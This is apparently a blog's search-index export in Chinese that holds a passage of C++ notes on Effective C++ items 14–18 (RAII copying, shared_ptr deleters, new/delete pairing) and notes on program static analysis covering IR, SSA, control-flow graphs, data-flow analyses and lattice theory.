operator">:</span>    Mutex <span class="token operator">*</span>mutexPtr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>例如访问临界区(critical section), 临界区即线程必须互斥地访问某些资源，这些资源必须只能由最多一个线程访问，我们就需要以RAII的方式来进行操作:<br><pre class="language-c" data-language="c"><code class="language-c">Mutex m<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span>              <span class="token comment">//创建一个代码块来定义临界区</span>  Lock <span class="token function">ml</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//构造锁ml，锁住m</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token comment">//执行临界区操作</span><span class="token punctuation">&#125;</span>              <span class="token comment">//临界区结束，调用ml的析构函数，解锁</span></code></pre><br>到现在为止以上的用法都是没有问题的，如果锁被拷贝了呢？<br><pre class="language-c" data-language="c"><code class="language-c">Lock <span class="token function">ml1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//m在ml1的构造过程中被锁住</span>Lock <span class="token function">ml2</span><span class="token punctuation">(</span>ml1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//把ml1拷贝进ml2，会发生什么?</span></code></pre><br>在创建自己的RAII资源管理类时，我们必须要思考需要如何规定这个类的拷贝行为。对于这个问题，我们有如下选择:</p><ul><li>禁止拷贝<br>如条款6中的把拷贝函数声明为私有来禁止拷贝</li><li>给资源引用计数：<br>有时需要一直持有一个资源直到最后一个对象使用完毕，要实现这样的功能，必须有一个计数器来统计当前有多少对象在使用这个资源。当生成一个拷贝时加一，当删除一个拷贝时减一，和shared_ptr是一样的原理。<br>可以替代裸指针把shared_ptr作为RAII对象的数据成员来实现这个功能，将mutexPtr的类型从Mutex*变成shared_ptr<Mutex>。我们知道默认下的shared_ptr在引用计数为零时会删除掉它所包含的指针，但对于Mutex锁，我们想要的是解锁而不是删除掉，否则我们是没有办法解开一个被删除的锁的。<br>shared_ptr提供了一个特殊的可定义函数，删除器(deleter)，即在引用计数为零时调用的函数，是shared_ptr构造函数的一个附加参数。这个函数在auto_ptr中是不存在的，因此它不能有自定义的删除行为，只能删除掉它包括的指针。<pre class="language-c" data-language="c"><code class="language-c">class Lock<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    explicit <span class="token function">Lock</span><span class="token punctuation">(</span>Mutex<span class="token operator">*</span> pm<span class="token punctuation">)</span>    <span class="token operator">:</span><span class="token function">mutexPtr</span><span class="token punctuation">(</span>pm<span class="token punctuation">,</span> unlock<span class="token punctuation">)</span>    <span class="token comment">//将unlock函数绑定到删除器</span>    <span class="token punctuation">&#123;</span><span class="token function">lock</span><span class="token punctuation">(</span>mutexPtr<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token comment">//这里其实不需要定义析构函数</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Mutex<span class="token operator">></span> mutexPtr<span class="token punctuation">;</span> <span class="token comment">//使用shared_ptr，不使用裸指针</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li><li><p>深拷贝封装的资源：<br>有时候我们可以拥有某个资源的多份拷贝，那么我们的资源管理类就要确保每一份拷贝都要在使用周期结束后释放资源，并且每一份拷贝互不干涉，因此拷贝这样的对象就要拷贝它包含的所有资源，进行深拷贝(deep copy)。例如当对象包含一个指针，我们必须先生成一个指针的拷贝，分配一个新的内存空间再把数据拷贝过来，这就是深拷贝。如果是浅拷贝，拷贝则直接使用了本体的指针成员，没有生成指针的拷贝，那么两个对象的指针成员就会指向同一个地址，删除拷贝就会导致本体被删除。</p></li><li><p>转移所有权：<br>有时候想要只有一个对象来持有这个资源，因此进行拷贝的时候，资源的所有权就要从本体转移到拷贝上，本体不再持有资源</p></li></ul><p>总结：</p><ul><li>拷贝RAII资源管理类的对象要根据它所包含的资源来具体考虑，我们想要资源展现出如何的拷贝行为，资源管理类就要展现出同样的拷贝行为。</li><li>常用的RAII类的拷贝行为有禁止拷贝，使用引用计数，拷贝资源，转移所有权，但也可以用其他做法来符合特殊需要。</li></ul><h2 id="条款15-提供对原始资源的访问"><a href="#条款15-提供对原始资源的访问" class="headerlink" title="条款15 提供对原始资源的访问"></a>条款15 提供对原始资源的访问</h2><p>使用条款13中的投资栗子：<br><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pInv</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//某个Investment的智能指针对象</span></code></pre><br>现有函数：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">daysHeld</span><span class="token punctuation">(</span><span class="token keyword">const</span> Investment<span class="token operator">*</span> pi<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//返回某个Investment对象的持有时间</span></code></pre><br>如果直接把智能指针对象传入上面的函数中：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> days <span class="token operator">=</span> <span class="token function">daysHeld</span><span class="token punctuation">(</span>pInv<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>这样编译器会报错，因为函数需要裸指针类型的参数，而你传入的是智能指针类型。你需要做的也很简单，把智能指针转换为裸指针，使用隐式转换或者显式转换。<br>shared_ptr有一个成员函数get()，用来执行显式转换，返回智能指针对象所包含的裸指针:<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> days <span class="token operator">=</span> <span class="token function">daysHeld</span><span class="token punctuation">(</span>pInv<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>shared_ptr重载了指针的解引用运算符，即-&gt;和*，这意味着我们可以通过它们来实现隐式转换：<br><pre class="language-c" data-language="c"><code class="language-c">class Investment<span class="token punctuation">&#123;</span>  <span class="token comment">//定义Investment继承层次的基类</span>  public<span class="token operator">:</span>    boos <span class="token function">isTaxFree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Investment<span class="token operator">*</span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用来返回指向Investment对象的指针</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">pi1</span><span class="token punctuation">(</span><span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//使用shared_ptr管理资源</span>bool taxable1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>pi1<span class="token operator">-></span><span class="token function">isTaxFree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//使用->操作符接触资源</span></code></pre><br>有时我们需要把RAII资源管理对象所封装的原始资源拿出来，我们可以定义一个转换函数，将资源管理类隐式或显式转换为原始资源。例如要实现对C API中的字体类型(font)的资源管理:<br><pre class="language-c" data-language="c"><code class="language-c">FontHandle <span class="token function">getFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//C API定义的分配字体函数</span><span class="token keyword">void</span> <span class="token function">releaseFont</span><span class="token punctuation">(</span>FontHandle fh<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//C API定义的释放字体函数</span></code></pre></p><p>现在我们定义自己的RAII资源管理类：<br><pre class="language-c" data-language="c"><code class="language-c">class Font<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    explicit <span class="token function">Font</span><span class="token punctuation">(</span>FontHandle fh<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token comment">//C只能使用值传递</span>    <span class="token function">f</span><span class="token punctuation">(</span>fh<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">//构造时获取资源</span>    <span class="token operator">~</span><span class="token function">Font</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">releaseFont</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token comment">//析构时释放资源</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  private<span class="token operator">:</span>    FontHandle f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>如果我们要使用某些C API只能使用FontHandle类型，我们就需要把Font类型显式转换为FontHandle类型，因此我们定义一个显式转换的函数get():<br><pre class="language-c" data-language="c"><code class="language-c">class Font<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  FontHandle <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token comment">//显式转换函数</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>这样写有两个缺点，第一个就是每次显示转换都需要使用get()函数；第二个<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">changeFontSize</span><span class="token punctuation">(</span>FontHandle f<span class="token punctuation">,</span> <span class="token keyword">int</span> newSize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//改变字体大小的C API</span>Font <span class="token function">f</span><span class="token punctuation">(</span><span class="token function">getFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> newFontSize<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">changeFontSize</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> newFontSize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//需要使用get()来显式转换</span></code></pre></p><p>总结：</p><ul><li>API通常需要使用原始资源作为参数，因此我们的RAII资源管理类要保证它所封装的资源是对外界可接触的。</li><li>可以通过隐式转换或显式转换来实现对外接触。显式转换总体上更安全，隐式转换则对用户更加方便。</li></ul><h2 id="条款16-成对使用new和delete时需要使用对应的形式"><a href="#条款16-成对使用new和delete时需要使用对应的形式" class="headerlink" title="条款16 成对使用new和delete时需要使用对应的形式"></a>条款16 成对使用new和delete时需要使用对应的形式</h2><p>考虑如下栗子：<br><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>string <span class="token operator">*</span>strArr <span class="token operator">=</span> new std<span class="token operator">::</span>string<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//动态分配100元素的字符串数组</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token comment">//使用</span>delete strArr<span class="token punctuation">;</span>  <span class="token comment">//释放</span></code></pre><br>这样只会释放第一个元素。</p><p>当使用new运算符的时候会发生两件事，申请的内存空间会先被分配出来，然后一个或者多个对象的构造函数被调用来填满这些空间。当使用delete的时候，则是先调用这些对象的析构函数，最后释放内存资源。</p><p>delete要删除多少个对象取决于在当前内存空间中调用多少个析构函数，那么编译器就需要知道到底是删除单个对象还是一个数组，因为单个对象和一个数组的对象有不同的内存布局：数组的内存除了它所包含的对象，还包括了一个额外的数，即数组的大小，用来告诉编译器调用多少个析构函数:<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token comment">//结果： 20 8</span></code></pre></p><p>总结：</p><ul><li>如果在new语句中使用了[ ]，就必须在对应的delete语句中也使用[ ]。如果在new语句中没有使用[ ]，就不要在对应的delete语句中使用[ ]。</li></ul><h2 id="条款17-以独立语句将newed对象置入智能指针"><a href="#条款17-以独立语句将newed对象置入智能指针" class="headerlink" title="条款17 以独立语句将newed对象置入智能指针"></a>条款17 以独立语句将newed对象置入智能指针</h2><p>考虑以下代码：<br><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">processWidget</span><span class="token punctuation">(</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span> pw<span class="token punctuation">,</span> <span class="token keyword">int</span> priority<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">processWidget</span><span class="token punctuation">(</span>std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">(</span>new Widget<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>C++中，一条语句里面的函数调用顺序是不确定的，所以代码可以拆分成三条语句：<br><pre class="language-c" data-language="c"><code class="language-c">new Widget<span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span>std<span class="token operator">::</span>tr1<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br>如果编译器首先执行了第三条语句，那么就会导致new Widget创建的对象还没加入到shared_ptr中，会造成资源泄漏。正确的做法应该是：<br><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>tr1<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Widget<span class="token operator">></span> <span class="token function">pw</span><span class="token punctuation">(</span>new Widget<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">processWidget</span><span class="token punctuation">(</span>pw<span class="token punctuation">,</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p><p>总结：</p><ul><li>以独立语句将newed对象置入智能指针类，如果不这样做，一旦异常抛出可能回导致资源泄露。</li></ul><h3 id="条款18-让接口容易被使用，难以被误用"><a href="#条款18-让接口容易被使用，难以被误用" class="headerlink" title="条款18 让接口容易被使用，难以被误用"></a>条款18 让接口容易被使用，难以被误用</h3>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Program Static Analysis Note</title>
      <link href="/2022/03/30/Program-Static-Analysis-Note/"/>
      <url>/2022/03/30/Program-Static-Analysis-Note/</url>
      
        <content type="html"><![CDATA[<h1 id="静态分析笔记"><a href="#静态分析笔记" class="headerlink" title="静态分析笔记"></a>静态分析笔记</h1><span id="more"></span><h2 id="1-定义介绍"><a href="#1-定义介绍" class="headerlink" title="1 定义介绍"></a>1 定义介绍</h2><p>静态分析：抽象 + 过近似(Over-approximate)</p><p>sound: Over-approximate 将所有可能的程序行为均包括（大于）。</p><p>complete: Under-approximate 所有包含的程序行为都是程序运行的。</p><p>false negatives: 漏报</p><p>false positives: 误报</p><h2 id="2-IR"><a href="#2-IR" class="headerlink" title="2 IR"></a>2 IR</h2><h3 id="1-编译器和静态分析"><a href="#1-编译器和静态分析" class="headerlink" title="1. 编译器和静态分析"></a>1. 编译器和静态分析</h3><p>源码-&gt;（Scanner - 词法Lexical分析-Regular Expression）-&gt;（Parser- 语法Syntax分析-Context-Free Grammar）， 生成AST -&gt;（Type Checker - 语义Semantic分析 - Attribute Grammar），生成 Decorated AST -&gt; Translator，生成IR，进行静态分析 -&gt; Code Generator<br><img src="IR_compiler.png" alt="compiler"></p><h3 id="2-AST-vs-IR"><a href="#2-AST-vs-IR" class="headerlink" title="2. AST vs. IR"></a>2. AST vs. IR</h3><p>AST: 高级，更接近于语法结构，依赖于语言种类，适用于快速类型检查，缺少控制流信息</p><p>IR: 低级，更接近于机器码，不依赖语言种类，压缩且简洁，包含控制流信息。是静态分析的基础</p><h3 id="3-3地址码（3AC）"><a href="#3-3地址码（3AC）" class="headerlink" title="3. 3地址码（3AC）"></a>3. 3地址码（3AC）</h3><pre class="language-none"><code class="language-none">a+b+3  -&gt; t1 &#x3D; a + b           t2 &#x3D; t1 + 3</code></pre><h3 id="4-SSA-静态单赋值"><a href="#4-SSA-静态单赋值" class="headerlink" title="4. SSA 静态单赋值"></a>4. SSA 静态单赋值</h3><p>定义：给每一个定义变量一个新的名字，传递到接下来的使用当中，每个变量有1个定义（赋值的目标变量）。</p><p><img src="IR_SSA.png" alt="SSA"></p><p>优点：唯一的变量名可以间接体现程序流信息，简化分析过程；清楚的Define-Use信息。</p><p>缺点：引入很多变量和phi-function；转换为机器码时效率变低（引入很多拷贝操作）。</p><h3 id="5-Basic-Blocks"><a href="#5-Basic-Blocks" class="headerlink" title="5. Basic Blocks"></a>5. Basic Blocks</h3><p>定义：只有1个开头入口和1个结尾出口的最长3-地址指令序列。</p><p>建立方法: </p><ol><li>第一条指令是入口;</li><li>任何跳转指令的目标地址是入口；</li><li>任何跟在跳转指令之后的指令是入口。</li><li>然后构造基本块，任何基本块包含1个入口指令和其接下来的指令。</li></ol><p><img src="IR_BB.png" alt="BB">   </p><h3 id="6-Control-Flow-Analysis（CFG）"><a href="#6-Control-Flow-Analysis（CFG）" class="headerlink" title="6. Control Flow Analysis（CFG）"></a>6. Control Flow Analysis（CFG）</h3><p>建立基本块之后，建立边的方法<br>建立方法：</p><ol><li>基本块A的结尾有跳转指令跳转到基本块B；</li><li>原始指令序列中，B紧跟着A，且A的结尾不是无条件跳转。</li><li>添加Entry / Exit：没有块跳转到该块 / 没有跳转到其他块。</li></ol><h2 id="3-数据流分析-Applications"><a href="#3-数据流分析-Applications" class="headerlink" title="3 数据流分析 Applications"></a>3 数据流分析 Applications</h2><h3 id="1-预备知识"><a href="#1-预备知识" class="headerlink" title="1. 预备知识"></a>1. 预备知识</h3><p>may analysis：输出可能正确的信息（需做over-approximation优化，才能成为Safe-approximation安全的近似，可以有误报-completeness），注意大多数静态分析都是may analysis</p><p>must analysis：输出必须正确的信息（需做under-approximation优化，才能成为Safe-approximation安全的近似，可以有漏报-soundness）</p><p>输入/输出状态：程序执行前/执行后的状态（本质就是抽象表达的数据的状态，如变量的状态）。</p><p>数据流分析的结果：最终得到，每一个程序点对应一个数据流值(data-flow value)，表示该点所有可能程序状态的一个抽象。例如，我只关心x、y的值，我就用抽象来表示x、y所有可能的值的集合（输入/输出的值域/约束），就代表了该程序点的程序状态。</p><ol><li>Forward Analysis前向分析：按程序执行顺序的分析。OUT[s]=fs(IN[s])，s-statement</li><li>Backward Analysis反向分析：逆向分析。IN[s]=fs(OUT[s])</li></ol><p>控制流约束：约束求解做的事情，推断计算输入到输出，或反向分析。</p><h3 id="2-Reaching-Definition-Analysis-may-analysis"><a href="#2-Reaching-Definition-Analysis-may-analysis" class="headerlink" title="2. Reaching Definition Analysis (may analysis)"></a>2. Reaching Definition Analysis (may analysis)</h3><p>问题定义：给变量v一个定义d（赋值），存在一条路径使得程序点p能够到达q，且在这个过程中不能改变v的赋值。</p><p>应用例子：检测未定义的变量，若v可达p且v没有被定义，则为未定义的变量。</p><p>抽象表示：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。</p><ol><li><p>公式分析：</p><p> Transfer Function ：$OUT[B] = gen_B \bigcup  (IN[B] - kill_B)$ ——怎么理解，就 是基于转换规则而得到。</p><p> 解释：基本块B的输出 = 块B内的所有变量v的定义（赋值/修改）语句 U （块B的输入 - 程序中其它所有定义了变量v的语句）。本质就是本块与前驱修改变量的语句 作用之和（去掉前驱的重复修改语句）。</p><p> Control Flow：$IN[B] = U_{p a_predecesso_of_B}Out[P]$ ——怎么理解，就是基于控制流而得到。</p><p> 解释：基本块B的输入 = 块B所有前驱块P的输出的并集。注意，所有前驱块意味着只要有一条路径能够到达块B，就是它的前驱，包括条件跳转与无条件跳转。</p></li><li><p>Algorithm</p><p>方法：首先所有基本块的OUT[B]初始化为空。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为程序中有循环存在，只要某块的OUT[B]变了，就意味着后继块的IN[B]变了）。</p><p><img src="DFA_A_RDA_A.png" alt=""></p></li><li><p>算法界限<br>$OUT[B] = gen_B \cup  (IN[B] - kill_B)$ ： $gen_B$和 $kill_B$是不变的，只有IN[B]在变化，所以说OUT[B]只会增加不会减少，n向量长度是有限的，所以最终肯定会停止。具体涉及到不动点证明，后续课程会讲解。</p></li></ol><h3 id="3-Live-Variables-Analysis-may-analysis"><a href="#3-Live-Variables-Analysis-may-analysis" class="headerlink" title="3. Live Variables Analysis (may analysis)"></a>3. Live Variables Analysis (may analysis)</h3><p>问题定义：某程序点p处的变量v，从p开始到exit块的CFG中是否有某条路径用到了v，如果用到了v，则v在p点为live，否则为dead。其中有一个隐含条件，在点p和引用点之间不能重定义v。</p><p>应用场景：可用于寄存器分配，如果寄存器满了，就需要替换掉不会被用到的变量。</p><p>抽象表示：程序中的n个变量用长度为n bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。</p><ol><li><p>公式分析</p><p>Control Flow：$OUT[B] = \cup_{a \, successor \, of \, B}IN[S]$</p><p>后向分析，只要有一条子路是live，父节点就是live</p><p>Transfer Function：$IN[B] = use_B \, \cup \, (OUT[B] - def_B)$</p><p>IN[B] = 本块中use出现在define之前的变量 U （OUT[B]出口的live情况 - 本块中出现了define的变量）。define指的是定义/赋值。</p></li><li><p>Algorithm</p><p>方法：首先初始化每个基本块的IN[B]为空集。遍历每一个基本块B，按以上两个公式计算块B的OUT[B]和IN[B]，只要这次遍历时有某个块的IN[B]发生变化，则重新遍历一次（因为有循环，只要某块的IN[B]变了，就意味前驱块的OUT[B]变了）。</p><p><img src="DFA_A_LVA_A.png" alt=""></p></li></ol><h3 id="4-Available-Expressions-Analysis-must-analysis"><a href="#4-Available-Expressions-Analysis-must-analysis" class="headerlink" title="4. Available Expressions Analysis (must analysis)"></a>4. Available Expressions Analysis (must analysis)</h3><p>问题定义：程序点p处的表达式x op y可用需满足2个条件，一是从entry到p点必须经过x op y，二是最后一次使用x op y之后，没有重定义操作数x、y。（如果重定义了x 或 y，如x = a op2 b，则原来的表达式x op y中的x或y就会被替代）。</p><p>应用场景：用于优化，检测全局公共子表达式。</p><p>抽象表示：程序中的n个表达式，用长度为n bit的向量来表示，1表示可用，0表示不可用。</p><ol><li><p>公式分析<br>Transfer Function：$OUT[B] = gen_B \cup (IN[B] - kill_B)$</p><p>解释：genB—基本块B中所有新的表达式（并且在这个表达式之后，不能对表达式中出现的变量进行重定义）—&gt;加入到OUT；killB—从IN中删除变量被重新定义的表达式。</p><p>Control Flow：$IN[B] = \cap P_{\, a\,predecessor\,of\,B }OUT[P]$</p><p>理解：从entry到p点的所有路径都必须经过该表达式。</p></li><li><p>Algorithm<br>方法：首先将OUT[entry]初始化为空，所有基本块的OUT[B]初始化为1…1。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为有循环，只要某块的OUT[B]变了，就意味后继块的IN[B]变了）。</p><p><img src="DFA_A_AEA_A.png" alt=""></p></li></ol><h3 id="5-Analysis"><a href="#5-Analysis" class="headerlink" title="5. Analysis"></a>5. Analysis</h3><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available Expressions</th></tr></thead><tbody><tr><td>Domain</td><td>赋值语句</td><td>变量</td><td>表达式</td></tr><tr><td>Direction</td><td>forward</td><td>backward</td><td>forward</td></tr><tr><td>May/Must</td><td>May</td><td>May</td><td>Must</td></tr><tr><td>Boundary</td><td>OUT[Entry]=    $\emptyset$</td><td>IN[Exit]=$\emptyset$</td><td>OUT[Entry]=$\emptyset$</td></tr><tr><td>Initialization</td><td>OUT[B]=$\empty$</td><td>IN[B]=$\empty$</td><td>OUT[B]=$\cap$</td></tr><tr><td>Transfer function</td><td>$OUT=gen U (IN - kill)$</td><td>same</td><td>same</td></tr><tr><td>Meet</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div><h2 id="4-数据流分析-Foundations"><a href="#4-数据流分析-Foundations" class="headerlink" title="4 数据流分析 Foundations"></a>4 数据流分析 Foundations</h2><h3 id="1-迭代算法-另一个角度"><a href="#1-迭代算法-另一个角度" class="headerlink" title="1. 迭代算法-另一个角度"></a>1. 迭代算法-另一个角度</h3><blockquote><p>本质：常见的数据流迭代算法，目的是通过迭代计算，最终得到一个稳定的不变的解。</p></blockquote><h3 id="2-偏序（Partial-Order）"><a href="#2-偏序（Partial-Order）" class="headerlink" title="2. 偏序（Partial Order）"></a>2. 偏序（Partial Order）</h3><p>定义： 给定偏序集$(P, \sqsubseteq)$，$\sqsubseteq$是集合P上的二元关系，若满足以下性质则为偏序集：</p><ul><li>$\forall x \in P, x \sqsubseteq x$ 自反性 Reflexivity</li><li>$\forall x,y \in P, x \sqsubseteq y \cap y \sqsubseteq x =&gt; x = y$ 反对称性 Antisymmetry</li><li>$\forall x,y,z \in P, x \sqsubseteq y \cap y \sqsubseteq z =&gt; x \sqsubseteq z$ 传递性 Transitivity</li></ul><p>例子：</p><ul><li>P是整数集，$\sqsubseteq$表示$\leq$，是偏序集；若$\sqsubseteq$表示&lt;，则显然不是偏序集。</li><li>P是英文单词集合，$\sqsubseteq$表示子串关系（可以存在两个元素不具有偏序关系，不可比性），是偏序集。 </li></ul><h3 id="3-上下界（Upper-and-Lower-Bounds）"><a href="#3-上下界（Upper-and-Lower-Bounds）" class="headerlink" title="3.上下界（Upper and Lower Bounds）"></a>3.上下界（Upper and Lower Bounds）</h3><p>定义：给定偏序集$(P, \sqsubseteq)$，且有P的子集$S \subseteq P$：</p><ul><li>$\forall x \in S , x \sqsubseteq u$, 其中$u \in P$，则u是子集S的上界 （注意，u并不一定属于S集）</li><li>$\forall x \in S,l \subseteq P$， 则l是S的下界</li></ul><p>最小上界：least upper bound（lub 或者称为join），用$⊔S$表示。上确界？</p><p>定义：对于子集S的任何一个上界u，均有$⊔S⊑u$。</p><p>最大下界：greatest lower bound（glb 或者称为meet），用$⊓S$  表示。下确界？</p><p>定义：对于子集S的任何一个下界l，均有$l⊑⊓S$。</p><p>性质：</p><ul><li>并非每个偏序集都有上下确界。</li><li>如果存在上下确界，则是唯一的。（传递性和反证法可证明）</li></ul><h3 id="4-格（Lattice），（半格）Semilattice，全格，格点积（Complete-and-Product-Lattice）"><a href="#4-格（Lattice），（半格）Semilattice，全格，格点积（Complete-and-Product-Lattice）" class="headerlink" title="4.格（Lattice），（半格）Semilattice，全格，格点积（Complete and Product Lattice）"></a>4.格（Lattice），（半格）Semilattice，全格，格点积（Complete and Product Lattice）</h3><h4 id="1-格"><a href="#1-格" class="headerlink" title="1. 格"></a>1. 格</h4><p>定义：给定一个偏序集$(P,⊑)$，$∀a,b∈P$，如果存在$a⊔b$和$a⊓b$，那么就称该偏序集为格。偏序集中的任意两个元素构成的集合均存在最小上界和最大下界，那么该 偏序集就是格。</p><h4 id="2-半格"><a href="#2-半格" class="headerlink" title="2. 半格"></a>2. 半格</h4><p>定义：给定一个偏序集(P,⊑)，∀a,b∈P：<br>当且仅当$a⊔b$存在（上确界），该偏序集叫做 join semilatice；</p><p>当且仅当$a⊓b$存在（下确界），该偏序集叫做 meet semilatice</p><h4 id="3-全格"><a href="#3-全格" class="headerlink" title="3. 全格"></a>3. 全格</h4><p>定义：对于格点 $(S, \sqsubseteq)$ （前提是格点）的任意子集S，$⊔S$上确界和$⊓S$下确界都存在，则为全格complete lattice。</p><p>符号：$\top = \sqcup P$ ，叫做top；$\perp = \sqcap  P$，叫做bottom。   </p><h3 id="5-单调性与不动点定理（Monotonicity-and-Fixed-Point-Theorem）"><a href="#5-单调性与不动点定理（Monotonicity-and-Fixed-Point-Theorem）" class="headerlink" title="5. 